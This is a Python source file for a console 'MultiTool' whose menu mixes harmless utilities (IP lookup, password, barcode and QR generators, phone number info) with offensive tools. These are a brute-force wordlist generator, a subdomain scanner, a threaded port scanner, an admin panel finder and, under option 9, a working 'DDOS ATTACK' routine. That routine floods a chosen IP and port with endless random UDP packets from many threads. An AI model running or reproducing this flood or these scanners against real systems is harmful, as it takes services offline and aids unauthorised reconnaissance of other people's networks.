import os
import time
from tqdm import tqdm
import pyfiglet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN13
from queue import Queue
import socket
import threading
from barcode.writer import ImageWriter
from pip._vendor.distlib.compat import raw_input
import phonenumbers
from phonenumbers import carrier, geocoder
from tabulate import tabulate

result = pyfiglet.figlet_format("MultiTool", font="5lineoblique")
print(result)

options = (
    "1- MY IP ADDRESS\n2- PASSWORD GENERATOR\n3- WORDLIST GENERATOR\n"
    "4- BARCODE GENERATOR\n5- QRCODE GENERATOR\n6- PHONE NUMBER INFO\n"
    "7- SUBDOMAIN SCANNER\n8- PORT SCANNER\n9- DDOS ATTACK\n10- ADMIN PANEL FINDER\n"
)
print(options)

select = int(input("ENTER YOUR CHOICE: "))

if select == 1:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("FIND MY IP"))
        loading()
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        print("YOUR DEVICE IS: " + IPAddr)
        raw_input("Press ENTER to Exit")

elif select == 2:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("PASSWORD GENERATOR"))
        loading()
        length = int(input("Enter the length of the password: "))

        def get_random_string(length):
            upper = "ABCDEFGHIJKLMNOPQRSTUVWYZ"
            lower = "abcdefghijklmnopqrstuvwxyz"
            numbers = "1234567890"
            spchars = "!@#$%^&*()?:"
            all_chars = upper + lower + numbers + spchars
            password = "".join(random.sample(all_chars, length))
            print(f"Generated password of length {length} is: {password}")

        get_random_string(length)
        raw_input("PRESS ENTER TO EXIT")

elif select == 3:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("WORDLIST GENERATOR"))
        loading()
        chars = input("ENTER THE LETTERS FOR COMBINATION: ")
        min_len, max_len = map(int, input("Enter the minimum and maximum length of password separated by commas: ").split(','))
        file_name = input("Enter the name of the file: ")
        p = []
        for i in range(min_len, max_len + 1):
            ans = len(chars) ** i
            p.append(ans)
        total_combinations = sum(p)
        raw_input("Press ENTER to start this")
        start_time = time.time()

        with open(file_name, 'a') as psd:
            for i in range(min_len, max_len + 1):
                for xs in itertools.product(chars, repeat=i):
                    psd.write(''.join(xs) + '\n')

        end_time = time.time()
        print("Process Completed at:", time.asctime())
        total_time = end_time - start_time
        rate = total_combinations / total_time
        print(f"Total time: {total_time:.2f} seconds, Rate: {rate:.2f} combinations/sec")
        raw_input("PRESS ENTER TO EXIT")

elif select == 4:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("BARCODE GENERATOR"))
        loading()
        print("GENERATED BARCODE WILL BE SAVED AS PNG FILE IN THE PRESENT DIRECTORY")

        def generate_barcode(number):
            my_code = EAN13(number, writer=ImageWriter())
            my_code.save("bar_code")

        generate_barcode(input("ENTER 12 DIGIT NUMBER TO GENERATE BAR CODE: "))
        raw_input("PRESS ENTER TO EXIT")

elif select == 5:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("QRCODE GENERATOR"))
        loading()
        print("GENERATED QR CODE WILL BE SAVED AS myqr.png")
        s = input("ENTER THE LINK TO CREATE A QRCODE: ")
        url = pyqrcode.create(s)
        url.svg("myqr.svg", scale=8)
        url.png("myqr.png", scale=6)
        raw_input("PRESS ENTER TO EXIT")

elif select == 6:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=60):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("PHONE NUMBER INFO"))
        loading()

    def num_scanner(phn_num):
        try:
            number = phonenumbers.parse(phn_num)
        
            description = geocoder.description_for_number(number, 'en')
        
            supplier = carrier.name_for_number(number, 'en')
        
            info = [["Country", "Supplier"], [description, supplier]]

            return tabulate(info, headers="firstrow", tablefmt="github")
    
        except phonenumbers.phonenumberutil.NumberParseException as e:
            return f"Error: {str(e)}"
        
    number = input("Enter the number: ")
    print(num_scanner(number))
    raw_input("PRESS ENTER TO EXIT")

elif select == 7:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text
    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("SUBDOMAIN SCANNER"))
        loading()
        print("IT TAKES TIME ACCORDING TO THE DOMAIN")
        print("USING DEFAULT ADDED WORDLIST WITH 781 WORDS")
        domain = input("ENTER THE DOMAIN TO SCAN: ")
        with open("subdomains.txt") as file:
            subdomains = file.read().splitlines()

        for subdomain in subdomains:
            url = f"http://{subdomain}.{domain}"
            try:
                requests.get(url)
                print(f"[+] Discovered subdomain: {url}")
            except requests.ConnectionError:
                pass

        raw_input("PRESS ENTER TO EXIT")

elif select == 8:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("PORT SCANNER"))
        loading()
        print("KEEP SOME PATIENCE, IT TAKES TIME ACCORDING TO THE OPEN PORTS AND PROVIDED IP")
        print("IN THIS SCANNER WE ARE SCANNING 1000 PORTS FROM 1 TO 1000")

        target = input("Enter the IP address: ")
        queue = Queue()
        open_ports = []

        def portscan(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                return True
            except:
                return False

        def fill_queue(port_list):
            for port in port_list:
                queue.put(port)

        def worker():
            while not queue.empty():
                port = queue.get()
                if portscan(port):
                    print("Port {} is open!".format(port))
                    open_ports.append(port)

        port_list = range(1, 1001)
        fill_queue(port_list)
        thread_list = []

        for t in range(10):
            thread = threading.Thread(target=worker)
            thread_list.append(thread)

        for thread in thread_list:
            thread.start()

        for thread in thread_list:
            thread.join()

        print("OPEN PORTS ARE:", open_ports)
        raw_input("PRESS ENTER TO EXIT")

elif select == 9:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("DDOS ATTACK"))
        loading()
        ip = input("Enter the IP address: ")
        port = int(input("Enter the Port: "))
        choice = input("Enter 'yes' to start: ")
        times = int(input("Enter the number of requests: "))
        threads = int(input("Enter the number of threads: "))

        def ddos():
            data = random._urandom(1024)
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (ip, port)
                for x in range(times):
                    s.sendto(data, addr)

        for y in range(threads):
            th = threading.Thread(target=ddos)
            th.start()

        raw_input("PRESS ENTER TO EXIT")

elif select == 10:
    def loading():
        for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
            time.sleep(0.01)

    def font(text):
        cool_text = pyfiglet.figlet_format(text,font="slant")
        return cool_text

    def window_size(columns=750, height=30):
        os.system("cls")
        os.system(f'mode con: cols={columns} lines={height}')

    if __name__ == "__main__":
        window_size(80, 20)
        print(font("ADMIN PANEL FINDER"))
        loading()
        target = input("ENTER THE TARGET DOMAIN: ")
        file_name = input("ENTER THE NAME OF THE FILE: ")

        def panel_scan(url):
            try:
                get = requests.get(url)
                return get.status_code
            except:
                pass

        with open(file_name, "r") as file:
            for link in file.readlines():
                url = f"{target}/{link}"
                if panel_scan(url) == 200:
                    print(f"[+] ADMIN PANEL FOUND AT {url}")
                else:
                    print(f"[-] FAILED ATTEMPT AT {url}")

        raw_input("PRESS ENTER TO EXIT")

else:
    print("INVALID CHOICE, TRY AGAIN!")
    raw_input("PRESS ENTER TO EXIT")
